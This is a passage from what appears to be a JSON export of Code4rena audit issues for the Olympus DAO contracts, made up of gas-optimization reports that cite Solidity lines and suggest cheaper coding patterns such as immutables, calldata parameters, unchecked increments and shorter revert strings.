{```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397) - [```for (uint256 i = 0; i < 5; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43) - [```for (uint256 i = 0; i < 32; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58)  ##### Recommendation Remove initialization for default values.   For example: ```for (uint256 i; i < reqLength; ) {```  # ### G-4. Some variables can be immutable ##### Description Using immutables is cheaper than storage-writing operations.  ##### Instances [```ERC20 public ohm;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  ##### Recommendation Use immutables where possible. Change to ``` ERC20 public immutable ohm;```  # ### G-5. ```> 0``` is  more expensive than ```=! 0``` ##### Instances [```if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247)  ##### Recommendation Use ```=! 0``` instead of ```> 0```, where possible.  # ### G-6. ```x += y``` is  more expensive than ```x = x + y``` ##### Instances - [```reserveDebt[token_][msg.sender] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [```totalDebt[token_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [```reserveDebt[token_][msg.sender] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [```totalDebt[token_] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [```if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [```else totalDebt[token_] -= oldDebt - amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132) - [```_movingAverage += (currentPrice - earliestPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [```_movingAverage -= (earliestPrice - currentPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [```total += startObservations_[i];```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222) - [```balanceOf[from_] -= amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [```balanceOf[to_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58) - [```_amountsPerMarket[id_][0] += inputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [```_amountsPerMarket[id_][1] += outputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144) - [```lastBeat += frequency();```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103) - [```totalEndorsementsForProposal[proposalId_] -= previousEndorsement;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194) - [```totalEndorsementsForProposal[proposalId_] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [```yesVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [```noVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  ##### Recommendation Use ```x = x + y``` instead of ```x += y```. Use ```x = x - y``` instead of ```x -= y```."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/330", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## Useless iterator initialization  in the loop  In the function _setPolicyPermissions() contract Kernel \u2018uint256 i\u2019 is initializing to 0 what is useless as type uint256 by default equals to 0.  **Recommendation:** Consider removing useless initialization to decrease the gas cost for calling functions  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391  ## IF statements order optimization  Contract OlympusInstructions function store() there is a check if the instruction array is not empty (the length is not equal to 0). It makes sense to do it first of all because if there are no instructions there is no point to keep function execution.  **Recommendation:** Consider moving the 48 line (check if the instruction array is not empty) below the 43 line to avoid the unnecessary operation of incrementation and call to storage in the case when the array is empty.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42   ## Function visibility optimization   In contract OlympusInstructions there is the function getInstructions() which is not called anywhere inside the contract, so can be marked as external instead of public.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37  In contract OlympusMinter there are a few functions that are not called inside the contract mintOhm() and burnOhm().  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  **Recommendation:** Consider changing visibility from public to external for function getInstructions() , mintOhm() and burnOhm(). "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/324", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Olympus DAO Contest Gas Optimization Report  ## Summary  These gas optimization issues were found during the code audit:  1. Use `calldata` instead of `memory` (66 instances) 2. Cache `<array>.length` (2 instances) 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances) 4. Long `require()`/`revert()` string (8 instances) 5. Using `bool`s for storage incurs overhead (20 instances) 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances) 7. Empty blocks should be removed (42 instances) 8. Don't initialize variables with default value (5 instances) 9. Use `++i`/`--i` instead of `i++`/`i--` (6 instances) 10. Split `require(xxx && yyy)` to `require(xxx)` and `require(yyy)` (3 instances) 11. Use uint256/int256 instead of other variations (245 instances) 12. Use `abi.encodePacked()` instead of `abi.encode()` (41 instances) 13. Use `private` instead of `public` for constants (17 instances) 14. Don't compare boolean expressions to boolean literals (4 instances) 15. Use custom errors instead of `revert()`/`require()` strings (24 instances) 16. Use shift right/left instead of division/multiplication if possible (9 instances)  Total 546 instances of 16 issues.  ## 1. Use `calldata` instead of `memory` (66 instances)  When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for loop to copy each index of the `calldata` to the `memory` index. This overhead can be optimized by using `calldata` directly.  ```solidity 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {}  2022-08-olympus/src/external/OlympusERC20.sol::133 => function tryRecover(bytes32 hash, bytes memory signature)  2022-08-olympus/src/external/OlympusERC20.sol::182 => function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {  2022-08-olympus/src/external/OlympusERC20.sol::689 => function name() public view returns (string memory) {  2022-08-olympus/src/external/OlympusERC20.sol::693 => function symbol() public view returns (string memory) {  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::23 => function description() external view returns (string memory);  2022-08-olympus/src/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  2022-08-olympus/src/modules/PRICE.sol::205 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/modules/RANGE.sol::275 => function range() external view returns (Range memory) {  2022-08-olympus/src/policies/BondCallback.sol::48 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") {  2022-08-olympus/src/policies/Governance.sol::61 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) {  2022-08-olympus/src/policies/Heart.sol::69 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::154 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::171 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/Operator.sol::793 => function status() external view override returns (Status memory) {  2022-08-olympus/src/policies/Operator.sol::798 => function config() external view override returns (Config memory) {  2022-08-olympus/src/policies/PriceConfig.sol::18 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/PriceConfig.sol::45 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/policies/TreasuryCustodian.sol::27 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::34 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::53 => function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {  2022-08-olympus/src/policies/VoterRegistration.sol::19 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/interfaces/IOperator.sol::146 => function status() external view returns (Status memory);  2022-08-olympus/src/policies/interfaces/IOperator.sol::149 => function config() external view returns (Config memory);  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::35 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::47 => function generateFixture(Module module_, Permissions[] memory requests_)  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::55 => function generateGodmodeFixture(Module module_, string memory contractName_)  2022-08-olympus/src/test/lib/UserFactory.sol::23 => function create(uint256 userNum) public returns (address[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::176 => function marketsFor(address payout_, address quote_) public view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::242 => function liveMarketsBy(address owner_) external view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermCDA.sol::33 => function createMarket(MarketParams memory params_) external override returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::129 => function createMarket(MarketParams memory params_) external virtual returns (uint256);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::132 => function _createMarket(MarketParams memory params_) internal returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::338 => function setDefaults(uint32[6] memory defaults_) external override requiresAuth {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::100 => function claimFees(ERC20[] memory tokens_, address to_) external override {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::285 => function _uint2str(uint256 _i) internal pure returns (string memory) {  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::43 => function batchRedeem(uint256[] memory tokenIds_, uint256[] memory amounts_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::120 => function balanceOfBatch(address[] memory owners, uint256[] memory ids)  2022-08-olympus/src/test/lib/larping.sol::89 => function larp(function () external returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::97 => function larpp(function () external payable returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::105 => function larpv(function () external view returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::10 => function jq(string memory query, string memory path)  2022-08-olympus/src/test/lib/quabi/Quabi.sol::23 => function getPath(string memory contractName) internal returns (string memory path) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::33 => function getSelectors(string memory query, string memory path) internal returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::47 => function getFunctions(string memory contractName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::54 => function getFunctionsWithModifier(string memory contractName, string memory modifierName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::11 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::18 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::22 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/mocks/MockPrice.sol::44 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::58 => function description() external view override returns (string memory) {}  2022-08-olympus/src/test/policies/Heart.t.sol::31 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/policies/Heart.t.sol::33 => function requestPermissions() external view override returns (Permissions[] memory requests) {}  2022-08-olympus/src/test/policies/PriceConfig.t.sol::102 => function getObs(uint8 nonce) internal returns (uint256[] memory) { ```  ## 2. Cache `<array>.length` (2 instances)  If `<array>.length` is used as for loop termination condition, then the `.length` method will be called in each iteration. Caching it in a local variable can save gas.  ```solidity 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::182 => uint256 len = forPayout.length; ```  ## 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances)  Starting from version 0.8.0, Solidity does overflow/underflow checks by default. It is a good feature to prevent vulnerabilities but it has a significant overhead, especially when used in for loop. When using uint256/int256, it is extremely hard to trigger overflow, so it makes sense to skip these checks. To suppress the overflow/underflow checks, use `unchecked {}`. For increment situations, just use `unchecked {}` directly; for decrement situations, add a `require()` statement before decrementing to prevent underflow.  ```solidity 2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::19 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::38 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::66 => for (uint256 i; i < num; ++i) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::129 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::135 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::158 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::165 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::183 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::186 => if (isLive(forPayout[i]) && address(quoteToken) == quote_) ++count;  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::192 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::221 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::245 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::254 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermTeller.sol::161 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::102 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::135 => for (uint256 i; i < ownersLength; ++i) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::16 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::32 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/modules/PRICE.t.sol::99 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::126 => for (uint256 i; i < observations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::224 => for (uint256 i; i < numObs; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::313 => for (uint256 i; i < price.numObservations(); ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::386 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::776 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::948 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::992 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1004 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1045 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1097 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1106 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1149 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1217 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1261 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1273 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1314 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1366 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1375 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1418 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1832 => for (uint256 i; i < 15; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::122 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::172 => for (uint256 i; i < numObservations; ++i) { ```  ## 4. Long `require()`/`revert()` string (8 instances)  Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::107 => revert(\"ECDSA: invalid signature 's' value\");  2022-08-olympus/src/external/OlympusERC20.sol::109 => revert(\"ECDSA: invalid signature 'v' value\");  2022-08-olympus/src/external/OlympusERC20.sol::597 => require(c / a == b, \"SafeMath: multiplication overflow\");  2022-08-olympus/src/external/OlympusERC20.sol::769 => require(sender != address(0), \"ERC20: transfer from the zero address\");  2022-08-olympus/src/external/OlympusERC20.sol::770 => require(recipient != address(0), \"ERC20: transfer to the zero address\");  2022-08-olympus/src/external/OlympusERC20.sol::788 => require(account != address(0), \"ERC20: burn from the zero address\");  2022-08-olympus/src/external/OlympusERC20.sol::802 => require(owner != address(0), \"ERC20: approve from the zero address\");  2022-08-olympus/src/external/OlympusERC20.sol::803 => require(spender != address(0), \"ERC20: approve to the zero address\"); ```  ## 5. Using `bool`s for storage incurs overhead (20 instances)  Use `uint256(1)` and `uint256(2)` for true/false. Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ```solidity 2022-08-olympus/src/Kernel.sol::113 => bool public isActive;  2022-08-olympus/src/Kernel.sol::207 => bool granted_  2022-08-olympus/src/Kernel.sol::394 => bool grant_  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized;  2022-08-olympus/src/modules/RANGE.sol::44 => bool active; // Whether or not the side is active (i.e. the Operator is performing market operations on this side, true = active, false = inactive)  2022-08-olympus/src/modules/RANGE.sol::216 => bool high_,  2022-08-olympus/src/policies/Heart.sol::33 => bool public active;  2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized;  2022-08-olympus/src/policies/Operator.sol::66 => bool public active;  2022-08-olympus/src/policies/Operator.sol::735 => bool sideActive = RANGE.active(high_);  2022-08-olympus/src/policies/interfaces/IOperator.sol::34 => bool[] observations; // individual observations: true = price on other side of average, false = price on same side of average  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::83 => bool public allowNewMarkets;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::636 => bool active  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::14 => bool capacityInQuote; // capacity limit is in payment token (true) or in payout (false, default)  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::52 => bool active;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::9 => bool active;  2022-08-olympus/src/test/mocks/MockPrice.sol::15 => bool public result;  2022-08-olympus/src/test/policies/Heart.t.sol::23 => bool public result; ```  ## 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances)  When dealing with unsigned integer types, comparisons with `!= 0` are cheaper then with `> 0`.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::245 => if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {  2022-08-olympus/src/external/OlympusERC20.sol::611 => require(b > 0, errorMessage);  2022-08-olympus/src/libraries/FullMath.sol::35 => require(denominator > 0);  2022-08-olympus/src/libraries/FullMath.sol::122 => if (mulmod(a, b, denominator) > 0) {  2022-08-olympus/src/policies/Governance.sol::247 => if (userVotesForProposal["}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# INFORMATIONAL SEVERITY ISSUES  **Change Function Visibilities**  **Description:**  Some functions in the contract are designed with a public function without being called internally within the contract. These sets of function with the public visibility costs will cost more call during interaction. The function shares the same name across modules.   The functions are: KEYCODE VERSION  **Remediation:**  For gas optimization, it\u2019s recommended to make these functions external since they were not directly used within the contract. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "1.-Post-increment / post-decrement cost more gas than pre-increment/pre-decrement. Modify the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686   2.- <array>.length should not be looked up in every loop of a for-loop The overheads outlined below are PER LOOP, excluding the first loop. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278   3.- Greater or equal/lower or equal cost more gas than greater/lower. Swich operators  <= / >= for < / > and change to increment / decrement the variable in consecuence: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683  4.- Greater than 0 cost more than !=0. Change the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247  5.- Variable1 += (-=) variable2 cost more gas than variable1 = Variable1 + (-) Variable2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254   6.- instead of using public for constats, use private. It saves gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137   7.-Do not contrast boolean expressions with boolean literals https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306   8.- Use of uints/ints more modest than 32 Bytes (256 pieces) causes above https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47 